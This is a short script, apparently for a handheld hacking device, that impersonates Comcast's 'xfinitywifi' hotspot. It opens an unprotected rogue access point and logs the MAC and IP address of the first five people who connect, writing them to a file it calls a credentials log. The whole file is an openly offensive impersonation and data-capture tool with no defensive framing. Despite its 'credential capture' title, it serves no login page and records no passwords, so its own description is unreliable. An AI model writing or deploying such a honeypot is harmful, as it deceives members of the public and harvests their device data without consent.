// Xfinity Evil Portal - Credential Capture Script
// Linux-compatible version with error handling

try {
    // Initialize paths using current directory
    const base_path = "./DarkLugia";
    const assets_path = base_path + "/assets";
    const logs_path = base_path + "/logs";
    
    // Ensure directories exist
    system.create_directory(logs_path);
    
    // Display startup screen
    display.clear();
    
    // Try to load splash image if available
    try {
        display.draw_image(assets_path + "/splash.png", 0, 0);
    } catch (e) {
        // Continue even if splash image missing
        console.log("Warning: splash.png not found");
    }
    
    display.print("XFINITY EVIL PORTAL");
    display.print("Starting WiFi honeypot...");
    
    // Start WiFi access point
    wifi.start_ap({
        ssid: "xfinitywifi",
        password: "",
        channel: 6,
        hidden: false,
        max_connections: 5
    });
    
    display.print("Portal Active");
    display.print("Waiting for connections...");
    
    // Listen for client connections
    var capture_count = 0;
    while(true) {
        var client = wifi.get_connected_client();
        
        if(client) {
            // Log captured client info
            var timestamp = system.get_time();
            var log_entry = timestamp + " | CLIENT: " + client.mac + " | IP: " + client.ip + "\n";
            
            storage.append(logs_path + "/xfinity_credentials.log", log_entry);
            
            // Play success sound if available
            try {
                audio.play(assets_path + "/roar.wav");
            } catch (e) {
                console.log("Warning: roar.wav not found");
            }
            
            display.print("CAPTURED: " + client.mac);
            capture_count++;
            
            if(capture_count >= 5) {
                break; // Exit after 5 captures
            }
        }
    }
    
    display.print("Capture Complete");
    wifi.stop_ap();
    
} catch (error) {
    display.clear();
    display.print("ERROR: Xfinity Portal Failed");
    display.print(error.toString());
    console.error("Xfinity portal error: " + error);
}